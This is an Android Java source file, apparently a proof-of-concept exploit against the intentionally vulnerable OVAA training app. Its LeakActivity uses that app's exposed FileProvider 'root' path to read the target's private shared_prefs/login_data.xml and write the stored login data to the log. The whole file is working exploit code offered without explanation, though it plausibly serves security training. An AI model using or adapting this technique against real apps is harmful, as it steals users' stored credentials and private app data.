package com.exploit.fileprovider;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class LeakActivity extends Activity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("LOG","started leak activity");
        Uri uri = Uri.parse("content://oversecured.ovaa.fileprovider/root/data/data/oversecured.ovaa/shared_prefs/login_data.xml");

        try {
            InputStream stream = getContentResolver().openInputStream(uri);
            InputStreamReader reader = new InputStreamReader(stream);
            BufferedReader read = new BufferedReader(reader);
            String str;
            Log.e("LOG","reading line...");
            while ((str = read.readLine()) != null){
                Log.i("READING",str);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
